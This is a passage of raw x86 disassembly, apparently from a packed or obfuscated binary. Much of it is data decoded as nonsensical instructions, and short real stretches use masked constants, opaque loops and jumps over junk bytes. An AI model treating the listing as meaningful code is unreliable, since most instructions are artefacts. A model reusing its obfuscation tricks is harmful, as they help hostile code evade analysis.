  405957:	and    DWORD PTR [ebx],0xffffff94
  40595a:	pop    eax
  40595b:	cs add eax,edx
  40595e:	mov    eax,es
  405960:	jl     0x405930
  405962:	int    0x89
  405964:	popf   
  405965:	sub    ecx,DWORD PTR [ebp-0x51]
  405968:	shr    DWORD PTR [edx],1
  40596a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596b:	cdq    
  40596c:	mov    cx,0x953b
  405970:	mov    esi,0x494755fc
  405975:	ja     0x405910
  405977:	sub    eax,0x1527d341
  40597c:	dec    eax
  40597d:	or     eax,0x5cb9e56
  405982:	clc    
  405983:	in     eax,dx
  405984:	xor    al,0x7d
  405986:	cmp    al,0xcd
  405988:	or     ecx,edx
  40598a:	xor    bh,al
  40598c:	loopne 0x405990
  40598e:	sub    DWORD PTR [edi-0x603b12c6],ebx
  405994:	outs   dx,BYTE PTR ds:[esi]
  405995:	add    ch,BYTE PTR [esi+0x4e]
  405998:	popa   
  405999:	add    cl,dl
  40599b:	dec    ebp
  40599c:	or     ebp,DWORD PTR [ebp+edi*8+0x4cc8530f]
  4059a3:	cli    
  4059a4:	push   ds
  4059a5:	ficom  WORD PTR [ecx+0x6b302e27]
  4059ab:	mov    ebp,0x36917ac2
  4059b0:	loopne 0x405937
  4059b2:	outs   dx,BYTE PTR ds:[esi]
  4059b3:	jp     0x405a06
  4059b5:	imul   ebx,DWORD PTR [eax+eiz*8],0x31
  4059b9:	sub    edx,DWORD PTR [ebx+0x21fa633e]
  4059bf:	mov    dl,0x54
  4059c1:	scas   al,BYTE PTR es:[edi]
  4059c2:	jmp    0x32a959f3
  4059c7:	jae    0x405a08
  4059c9:	les    eax,FWORD PTR [ecx]
  4059cb:	not    esi
  4059cd:	test   al,0x6a
  4059cf:	sub    BYTE PTR [ebp+0x3d],ah
  4059d2:	pushf  
  4059d3:	and    ecx,DWORD PTR [eax+0x6]
  4059d6:	and    ebp,eax
  4059d8:	mov    BYTE PTR [ebp+ebp*2-0x5db08c13],al
  4059df:	jecxz  0x40599d
  4059e1:	adc    bh,BYTE PTR [ebx]
  4059e3:	fisubr DWORD PTR [edx-0x27]
  4059e6:	retf   0xf9f7
  4059e9:	push   0x83284f3d
  4059ee:	imul   esi,DWORD PTR [edx+0x6d92ab04],0xf0151d24
  4059f8:	cdq    
  4059f9:	mov    ds:0xc1ba8b53,eax
  4059fe:	call   0xa8b8:0x7e499734
  405a05:	adc    dl,dl
  405a07:	cmc    
  405a08:	adc    al,0x44
  405a0a:	jle    0x405a36
  405a0c:	push   ebx
  405a0d:	add    al,0xa1
  405a0f:	push   esi
  405a10:	lahf   
  405a11:	(bad)  
  405a12:	mov    al,ds:0xe890cc15
  405a17:	aad    0xc2
  405a19:	pop    es
  405a1a:	es xor ebp,0x4f
  405a1e:	mov    dl,0x83
  405a20:	jmp    0x1ec4:0x533c001a
  405a27:	adc    BYTE PTR [ecx],0x55
  405a2a:	fwait
  405a2b:	js     0x405a9f
  405a2d:	or     dh,BYTE PTR [edi+0x188e95f1]
  405a33:	mov    al,ds:0xbd217946
  405a38:	jmp    0x405aa1
  405a3a:	sub    eax,0x4fbb03f2
  405a3f:	cld    
  405a40:	je     0x4059fe
  405a42:	sbb    esp,ecx
  405a44:	xor    ebp,eax
  405a46:	and    bl,0xb8
  405a49:	(bad)  
  405a4a:	das    
  405a4b:	jmp    0x405a98
  405a4d:	inc    edx
  405a4e:	cmp    al,0xbd
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xc167624d
  405b88:	out    0xd9,al
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405b2a
  405b93:	inc    ebx
  405b94:	test   DWORD PTR [ebp-0x5dd60b5e],ecx
  405b9a:	fcomp  DWORD PTR [ecx+eiz*1-0x50]
  405b9e:	sar    dh,0x3b
  405ba1:	xor    DWORD PTR [esp+ebx*8+0x2c8ccdc0],eax
  405ba8:	inc    eax
  405ba9:	iret   
  405baa:	pushf  
  405bab:	mov    ecx,0xa10856e
  405bb0:	daa    
  405bb1:	out    0x3e,eax
  405bb3:	test   eax,0x21ddb476
  405bb8:	or     al,cl
  405bba:	mov    ds:0x725e903c,al
  405bbf:	inc    eax
  405bc0:	mov    eax,0xad50fef4
  405bc5:	dec    ecx
  405bc6:	test   dl,ah
  405bc8:	cmp    eax,0xb83c6718
  405bcd:	and    BYTE PTR [edi],ah
  405bcf:	pop    edx
  405bd0:	push   ss
  405bd1:	xchg   esp,eax
  405bd2:	mov    BYTE PTR [eax+0x1b],cl
  405bd5:	mov    eax,ds:0xe14eca8d
  405bda:	jl     0x405bd2
  405bdc:	cmp    al,0x81
  405bde:	lahf   
  405bdf:	(bad)  
  405be0:	xor    ch,BYTE PTR [edx+edi*2-0x3f173851]
  405be7:	inc    ecx
  405be8:	aad    0x6a
  405bea:	mov    bh,0xcd
  405bec:	and    BYTE PTR [ebx+0xd7a295a],al
  405bf2:	or     eax,0xd7a8920
  405bf7:	ror    BYTE PTR [edx-0xdc6bd5],1
  405bfd:	mov    edx,0x1936da5c
  405c02:	adc    bh,0xc9
  405c05:	sub    cl,BYTE PTR [ecx+0x5f]
  405c08:	pop    eax
  405c09:	or     BYTE PTR [ebx-0x7d41f12f],bh
  405c0f:	inc    ebp
  405c10:	pop    ebp
  405c11:	std    
  405c12:	pushf  
  405c13:	ja     0x405bb5
  405c15:	(bad)  
  405c16:	cmc    
  405c17:	push   cs
  405c18:	xor    bl,BYTE PTR [ecx+0xe]
  405c1b:	pop    edi
  405c1c:	loop   0x405bd8
  405c1e:	or     al,0x67
  405c20:	pusha  
  405c21:	shl    BYTE PTR [edx+0x31],cl
  405c24:	pushf  
  405c25:	push   ebp
  405c26:	push   0x68
  405c28:	cmp    eax,0xeef24d24
  405c2d:	and    eax,0x5bfb692b
  405c32:	jno    0x405bfe
  405c34:	adc    eax,0x824f0ee8
  405c39:	jne    0x405bde
  405c3b:	nop
  405c3c:	mov    dl,0xd9
  405c3e:	mov    eax,ds:0xd1f2234e
  405c43:	add    al,0x77
  405c45:	cli    
  405c46:	inc    eax
  405c47:	test   al,0xf4
  405c49:	in     eax,0xdd
  405c4b:	repnz sbb eax,0x776a3619
  405c51:	imul   BYTE PTR [ecx]
  405c53:	mov    bl,0xa5
  405c56:	nop
  405c57:	mov    ch,0x91
  405c59:	cmp    edx,DWORD PTR fs:[ebx]
  405c5c:	retf   0x76e7
  405c5f:	bnd jmp 0x405cbd
  405c62:	adc    eax,ebx
  405c64:	dec    ebp
  405c65:	pop    eax
  405c66:	es inc ecx
  405c68:	and    DWORD PTR [ebx],edx
  405c6a:	les    ebp,FWORD PTR [eax+eiz*4+0x57201f18]
  405c71:	sub    BYTE PTR [eax-0x42bc69a4],bl
  405c77:	cwde   
  405c78:	std    
  405c79:	pop    ss
  405c7a:	jnp    0x405c3f
  405c7c:	or     al,0x4b
  405c7e:	cmp    BYTE PTR ds:0x9892a444,bl
  405c84:	push   ecx
  405c85:	(bad)  
  405c86:	test   BYTE PTR ds:0x39d9a374,0xbb
  405c8d:	pop    ds
  405c8e:	stc    
  405c8f:	(bad)  
  405c90:	mov    ebx,0xaa738147
  405c95:	jg     0x405c4d
  405c97:	push   eax
  405c98:	seto   BYTE PTR [eax]
  405c9b:	mov    bl,0x4b
  405c9d:	sbb    DWORD PTR [esi],eax
  405c9f:	ror    BYTE PTR [edx-0x58],cl
  405ca2:	inc    ebp
  405ca3:	push   0x497c8a6b
  405ca8:	mov    ds:0xea74691d,al
  405cad:	inc    ebx
  405cae:	xchg   ebx,eax
  405caf:	loopne 0x405cf3
  405cb1:	les    ebp,FWORD PTR [eax]
  405cb3:	inc    eax
  405cb4:	dec    ecx
  405cb5:	mov    WORD PTR [edi],?
  405cb7:	xchg   ecx,eax
  405cb8:	popf   
  405cb9:	dec    ebx
  405cba:	sub    BYTE PTR [edx-0x5b543090],ah
  405cc0:	outs   dx,DWORD PTR ds:[esi]
  405cc1:	push   edx
  405cc2:	mov    eax,0xc8e4f61b
  405cc7:	fdivr  QWORD PTR [edi-0x23]
  405cca:	push   0xa1bc996f
  405ccf:	or     dl,al
  405cd1:	xor    ah,BYTE PTR [esi+0x68]
  405cd4:	test   DWORD PTR [ecx+0x4548fcbc],0xdf77f28a
  405cde:	and    ecx,0x7bf1320f
  405ce4:	mov    BYTE PTR [esi],0x1c
  405ce7:	xchg   edx,eax
  405ce8:	nop
  405ce9:	xchg   ecx,eax
  405cea:	fisubr DWORD PTR ds:0x92085565
  405cf0:	stos   DWORD PTR es:[edi],eax
  405cf1:	cmp    dh,BYTE PTR [ebx-0x36f6866a]
  405cf7:	cwde   
  405cf8:	xchg   esi,eax
  405cf9:	push   0x7317e82a
  405cfe:	lahf   
  405cff:	lock rcl BYTE PTR [ebx-0x61],1
  405d03:	mov    eax,ds:0x6892cebe
  405d08:	cmpps  xmm5,XMMWORD PTR [ecx],0xf
  405d0c:	sbb    esi,0xf7e7b7c0
  405d12:	inc    esi
  405d13:	in     eax,0x1a
  405d15:	bound  esp,QWORD PTR ds:0xfed7a2e6
  405d1b:	div    ebx
  405d1d:	add    bh,ah
  405d1f:	pusha  
  405d20:	nop
  405d21:	inc    esp
  405d22:	imul   BYTE PTR [ebx]
  405d24:	mov    ds:0xaceddba6,al
  405d29:	scas   al,BYTE PTR es:[edi]
  405d2a:	nop
  405d2b:	sbb    al,0x76
  405d2d:	jp     0x405cdc
  405d2f:	into   
  405d30:	outs   dx,BYTE PTR ds:[esi]
  405d31:	(bad)  
  405d32:	sbb    al,0x85
  405d34:	cmp    bh,bl
  405d36:	sbb    DWORD PTR [edi+0x7358c9b0],edx
  405d3c:	imul   edx,ecx,0xad87f15a
  405d42:	sar    DWORD PTR [ecx+0x4e4703cf],1
  405d48:	pusha  
  405d49:	push   ebx
  405d4a:	cli    
  405d4b:	push   edi
  405d4c:	test   DWORD PTR [ebx-0x6fd2ae4e],esp
  405d52:	mov    eax,ds:0x3a3f412f
  405d57:	sbb    eax,0x746a1e31
  405d5c:	sti    
  405d5d:	add    bl,BYTE PTR [edi-0x57]
  405d60:	jecxz  0x405dbe
  405d62:	les    ebp,FWORD PTR [edi+0x79139f22]
  405d68:	mov    edx,0x679e9bad
  405d6d:	sbb    al,0xbe
  405d6f:	jge    0x405d25
  405d71:	mov    esp,0x51f11ec1
  405d76:	or     eax,0xc217daee
  405d7b:	sub    al,0xc1
  405d7d:	dec    esi
  405d7e:	arpl   cx,cx
  405d80:	or     DWORD PTR [eax],eax
  405d82:	jae    0x405db6
  405d84:	add    ebp,DWORD PTR [edi-0x368b24d0]
  405d8a:	jp     0x405d6c
  405d8c:	iret   
  405d8d:	out    0x10,al
  405d8f:	push   cs
  405d90:	pop    ss
  405d91:	(bad)  
  405d92:	out    dx,eax
  405d93:	retf   0x1bae
  405d96:	cli    
  405d97:	les    esp,FWORD PTR [edx]
  405d99:	outs   dx,BYTE PTR ds:[esi]
  405d9a:	xchg   edx,eax
  405d9b:	call   0x81d9:0x327e3bc0
  405da2:	cs mov edx,0x2cbd8074
  405da8:	and    esp,esp
  405daa:	cmc    
  405dab:	or     eax,0xa97f77e
  405db0:	mov    esp,?
  405db2:	cld    
  405db3:	and    BYTE PTR [edi],dl
  405db5:	add    esi,edi
  405db7:	fs cld 
  405db9:	add    DWORD PTR [edx+0x78],edx
  405dbc:	add    al,0x75
  405dbe:	das    
  405dbf:	mov    cs,WORD PTR [ebp+0x68a3f003]
  405dc5:	push   ecx
  405dc6:	imul   ebp,DWORD PTR [edi],0xffffffbf
  405dc9:	aas    
  405dca:	sub    dl,BYTE PTR [ecx]
  405dcc:	mov    eax,DWORD PTR [ecx]
  405dce:	mov    ecx,0x166af329
  405dd3:	xor    ebp,DWORD PTR [ecx-0x491c8565]
  405dd9:	sbb    eax,0xbe08b614
  405dde:	data16 or bh,BYTE PTR [ebp+eax*1-0x9]
  405de3:	mov    cl,0x4a
  405de5:	jl     0x405d77
  405de7:	imul   ebp,DWORD PTR [ebp-0x16],0xffffffe4
  405deb:	dec    ecx
  405dec:	in     eax,0x32
  405dee:	push   es
  405def:	mov    ds:0x815e6c85,eax
  405df4:	mov    ah,0x4
  405df6:	xchg   ebp,eax
  405df7:	xor    DWORD PTR [esi+eax*2-0x2b14d6f4],0x3
  405dff:	push   ss
  405e00:	sti    
  405e01:	test   DWORD PTR [ebp+0x5f],eax
  405e04:	shl    DWORD PTR [ecx+0x71458b6e],cl
  405e0a:	sbb    eax,0xbfe46395
  405e0f:	bound  esi,QWORD PTR [esi+0x1dafe538]
  405e15:	lods   al,BYTE PTR ds:[esi]
  405e16:	ins    BYTE PTR es:[edi],dx
  405e17:	adc    al,0x92
  405e19:	pushf  
  405e1a:	ss add eax,0x8e0644ce
  405e20:	adc    BYTE PTR [ecx-0x155db0e9],dl
  405e26:	xor    edx,esi
  405e28:	pushf  
  405e29:	sub    al,0x81
  405e2b:	dec    ebx
  405e2c:	and    eax,0x2bd88ace
  405e31:	pop    ds
  405e32:	ret    
  405e33:	lea    esp,[edx+0x36]
  405e36:	add    al,0xd0
  405e38:	inc    esi
  405e39:	xor    al,0x7c
  405e3b:	sbb    al,0xc
  405e3d:	add    dh,BYTE PTR [esi+0x7dc51c23]
  405e43:	mov    al,0x95
  405e45:	mov    dh,0xeb
  405e47:	or     dh,BYTE PTR [ebx]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x96
  405ea8:	shl    DWORD PTR [ebp+0x703f3e7e],1
  405eae:	jo     0x405e57
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f23
  405eb4:	out    dx,al
  405eb5:	jo     0x405f01
  405eb7:	loope  0x405e66
  405eb9:	mov    bh,al
  405ebb:	pop    edx
  405ebc:	aad    0x1
  405ebe:	jp     0x405ef5
  405ec0:	les    esp,FWORD PTR [esi+ecx*8]
  405ec3:	cwde   
  405ec4:	scas   eax,DWORD PTR es:[edi]
  405ec5:	aas    
  405ec6:	lds    edx,FWORD PTR [esi+0xae195ff]
  405ecc:	das    
  405ecd:	ret    0xd8e3
  405ed0:	inc    edx
  405ed1:	(bad)  
  405ed2:	or     al,0x86
  405ed4:	adc    eax,0x72abc597
  405ed9:	leave  
  405eda:	pop    ecx
  405edb:	mov    dl,0xa
  405edd:	call   0xc2d0:0xac94b983
  405ee4:	inc    ebp
  405ee5:	ficom  WORD PTR [edi+edx*1]
  405ee8:	js     0x405ea9
  405eea:	lahf   
  405eeb:	mov    ch,0xb4
  405eed:	bound  ebp,QWORD PTR [edi]
  405eef:	ret    0xf278
  405ef2:	mov    dl,0x52
  405ef4:	push   edi
  405ef5:	retf   0x255f
  405ef8:	inc    ebp
  405ef9:	jne    0x405f76
  405efb:	ret    
  405efc:	ins    DWORD PTR es:[edi],dx
  405efd:	pop    esp
  405efe:	cs pop edi
  405f00:	pop    ebp
  405f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f02:	sbb    al,dl
  405f04:	aam    0x9e
  405f06:	xchg   ecx,eax
  405f07:	and    cl,dl
  405f09:	arpl   WORD PTR [edi],si
  405f0b:	lock sti 
  405f0d:	jge    0x405f56
  405f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f10:	pop    es
  405f11:	sub    edx,0xf389a131
  405f17:	fadd   st(6),st
  405f19:	imul   ebp,edx,0x19
  405f1c:	jl     0x405eb9
  405f1e:	imul   edi,DWORD PTR [ecx+0x1c],0xffffffda
  405f22:	test   al,0xa5
  405f24:	xchg   BYTE PTR [ebx+ebx*1-0x7e257ce9],dl
  405f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2c:	repnz pop eax
  405f2e:	test   BYTE PTR [esi+0x15b32f31],dh
  405f34:	push   esi
  405f35:	pop    esi
  405f36:	int3   
  405f37:	cwde   
  405f38:	xchg   edx,eax
  405f39:	ret    0x51c0
  405f3c:	and    al,bh
  405f3e:	or     DWORD PTR [eax+0x5b626f83],ebp
  405f44:	inc    edx
  405f45:	ds dec esi
  405f47:	dec    edx
  405f48:	sar    DWORD PTR [ecx-0x53],1
  405f4b:	(bad)  
  405f4c:	mov    ebp,0x7ea78ec4
  405f51:	mov    WORD PTR [ebx+ebp*1+0x30d0643],ss
  405f58:	dec    esp
  405f59:	(bad)  
  405f5a:	xor    DWORD PTR [edi],edi
  405f5c:	in     eax,0xba
  405f5e:	mov    ds:0x67466d8d,al
  405f63:	cmp    bh,BYTE PTR [edx-0xf]
  405f66:	xchg   ebx,eax
  405f67:	inc    eax
  405f68:	test   ah,al
  405f6a:	mov    ch,0xbc
  405f6c:	fdivr  st,st(3)
  405f6e:	into   
  405f6f:	mov    eax,0xc61ec69a
  405f74:	lods   al,BYTE PTR ds:[esi]
  405f75:	mov    ?,esp
  405f77:	inc    ebx
  405f78:	ds add ch,ch
  405f7b:	xor    dh,BYTE PTR [ecx+esi*2-0x74]
  405f7f:	inc    DWORD PTR [edi-0x57]
  405f82:	inc    ebp
  405f83:	cmc    
  405f84:	mov    ds:0xcfe8f61f,eax
  405f89:	aad    0x2b
  405f8b:	outs   dx,BYTE PTR ds:[esi]
  405f8c:	ss pop esi
  405f8e:	bound  esi,QWORD PTR [ebx]
  405f90:	ins    BYTE PTR es:[edi],dx
  405f91:	sbb    dl,al
  405f93:	sbb    BYTE PTR [edx-0x40],ah
  405f96:	int    0xd
  405f98:	push   ecx
  405f99:	push   edx
  405f9a:	fwait
  405f9b:	into   
  405f9c:	adc    DWORD PTR [edx+0x2b],edi
  405f9f:	enter  0x3ff3,0xb5
  405fa3:	cs test al,0x8d
  405fa6:	aad    0x32
  405fa8:	adc    bh,BYTE PTR [edx+0x4d6c079]
  405fae:	adc    BYTE PTR [ecx+edx*1-0x495e3bc8],al
  405fb5:	sub    ebx,eax
  405fb7:	cmp    ch,BYTE PTR [eax-0x5d]
  405fba:	jns    0x405fb8
  405fbc:	imul   eax,eax,0x59
  405fbf:	jmp    0x405fa1
  405fc1:	adc    eax,0x33df947d
  405fc6:	pop    edi
  405fc7:	pop    ss
  405fc8:	mov    edi,DWORD PTR [eax+ebx*4-0x30fa05fe]
  405fcf:	mov    ch,0xab
  405fd1:	xchg   ebp,eax
  405fd2:	(bad)  
  405fd3:	(bad)  
  405fd4:	clc    
  405fd5:	adc    dl,bh
  405fd7:	jle    0x405f86
  405fd9:	daa    
  405fda:	cmp    al,0x8a
  405fdc:	fcom   DWORD PTR [edi]
  405fde:	into   
  405fdf:	push   esi
  405fe0:	ja     0x405ffe
  405fe2:	xchg   ebx,eax
  405fe3:	dec    eax
  405fe4:	mov    edx,0x63531ad4
  405fe9:	jg     0x406053
  405feb:	loop   0x405fb9
  405fed:	inc    eax
  405fee:	test   BYTE PTR [ebx],0xd6
  405ff1:	or     eax,0x4fe835e6
  405ff6:	aam    0xb9
  405ff8:	imul   ecx,DWORD PTR [ebx],0xffffffdc
  405ffb:	pop    esi
  405ffc:	in     eax,dx
  405ffd:	sbb    al,0xce
  405fff:	xchg   edi,eax
  406000:	cli    
  406001:	(bad)  
  406002:	jmp    0x2df90e5e
  406007:	loopne 0x40600b
  406009:	int3   
  40600a:	xor    BYTE PTR ds:0x778508aa,ch
  406010:	xchg   edx,eax
  406011:	addr16 addr16 push ds
  406014:	cmp    eax,0x9822b860
  406019:	sub    esi,DWORD PTR ds:0xa214ea22
  40601f:	push   0x7ae90d0c
  406024:	and    al,0x26
  406026:	cmp    al,0x8c
  406028:	pop    ss
  406029:	sub    al,ah
  40602b:	fisubr DWORD PTR [bp+di+0x3ed]
  406030:	pop    es
  406031:	sub    edi,DWORD PTR [edi]
  406033:	pop    eax
  406034:	cwde   
  406035:	loopne 0x405fd7
  406037:	in     eax,dx
  406038:	dec    esp
  406039:	mov    WORD PTR [esi-0x6b322e02],cs
  40603f:	in     al,0x3a
  406041:	iret   
  406042:	imul   ebx,DWORD PTR [esi+eax*4-0x72131f31],0xbe75c6d6
  40604d:	hlt    
  40604e:	mov    ds:0x34ff4f68,al
  406053:	stos   DWORD PTR es:[edi],eax
  406054:	pushf  
  406055:	xor    eax,0xf71e28c9
  40605a:	or     ecx,DWORD PTR [edx+0x5]
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fd860d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x91b8cd96
  4060dc:	mov    ah,BYTE PTR [ebp+0x3e]
  4060df:	jo     0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406126
  4060e6:	add    eax,0xcfc63a31
  4060eb:	das    
  4060ec:	push   es
  4060ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ee:	mov    esp,0x8e9609fc
  4060f3:	add    BYTE PTR [edx-0x1042330c],bh
  4060f9:	cmp    DWORD PTR [edi+0x35],esp
  4060fc:	push   0xffffff90
  4060fe:	xchg   edi,eax
  4060ff:	pop    edx
  406100:	sbb    DWORD PTR [esi+0x18114c25],ebx
  406106:	mov    cl,0xd8
  406108:	mov    dl,0x42
  40610a:	sbb    BYTE PTR [edx],0x2f
  40610d:	test   eax,0xa1e75ece
  406112:	pushf  
  406113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406114:	jno    0x4060ca
  406116:	dec    edx
  406117:	xchg   ebx,eax
  406118:	push   0x10
  40611a:	fmul   st(4),st
  40611c:	stos   BYTE PTR es:[edi],al
  40611d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40611e:	dec    ebx
  40611f:	inc    eax
  406120:	and    ch,BYTE PTR [ecx]
  406122:	sub    eax,0xc9e3fd81
  406127:	rol    DWORD PTR [esi],cl
  406129:	inc    edi
  40612a:	inc    ecx
  40612b:	xor    eax,0xf2114417
  406130:	int    0x5
  406132:	mov    BYTE PTR [ecx+0x32],al
  406135:	jmp    0x406124
  406137:	repz push esp
  406139:	dec    ebx
  40613a:	mov    ecx,0x76b0019f
  40613f:	inc    ebp
  406140:	sbb    esp,DWORD PTR [eax-0x837d988]
  406146:	lock fcom DWORD PTR [eax-0x5f]
  40614a:	jnp    0x4060df
  40614c:	add    eax,0xd8c1e6ff
  406151:	ins    DWORD PTR es:[edi],dx
  406152:	jbe    0x406122
  406154:	popf   
  406155:	imul   ebx,esi,0xffffffa0
  406158:	and    al,0xa6
  40615a:	push   ecx
  40615b:	pushf  
  40615c:	jnp    0x406114
  40615e:	ret    
  40615f:	pop    edi
  406160:	mov    ebx,0x54fa7f39
  406165:	sbb    esp,DWORD PTR ds:0xabfc5efc
  40616b:	fdiv   QWORD PTR [eax-0x3dbdfc33]
  406171:	ror    DWORD PTR [esi+0x348285d6],0x2f
  406178:	or     cl,BYTE PTR [edi-0x67]
  40617b:	add    BYTE PTR [esi],0xe1
  40617e:	push   ds
  40617f:	ds (bad) 
  406181:	adc    ebx,DWORD PTR [esi+0x23]
  406184:	jns    0x4061ed
  406186:	imul   edi,DWORD PTR [ecx+0x6cd822a1],0xffffffa4
  40618d:	imul   eax,ebp,0x1c
  406190:	mov    bh,0x64
  406192:	add    DWORD PTR [eax-0x69],ecx
  406195:	dec    ebx
  406196:	lods   eax,DWORD PTR ds:[esi]
  406197:	add    dl,BYTE PTR [edi+esi*2+0x20af11d1]
  40619e:	pop    ss
  40619f:	sbb    ecx,DWORD PTR [eax-0x6c]
  4061a2:	sti    
  4061a3:	sbb    DWORD PTR [edi+eiz*1-0x66],ebx
  4061a7:	stos   BYTE PTR es:[edi],al
  4061a8:	test   BYTE PTR [ebx],bl
  4061aa:	into   
  4061ab:	sub    dl,0xb8
  4061ae:	push   ebx
  4061af:	ja     0x40613c
  4061b1:	pop    ss
  4061b2:	int3   
  4061b3:	mov    ds:0x5261fb9f,al
  4061b8:	mov    eax,ds:0x9fd0a213
  4061bd:	jp     0x406169
  4061bf:	dec    eax
  4061c0:	xchg   ebp,eax
  4061c1:	sub    eax,DWORD PTR [esi-0x7771ec82]
  4061c7:	or     ah,0x3c
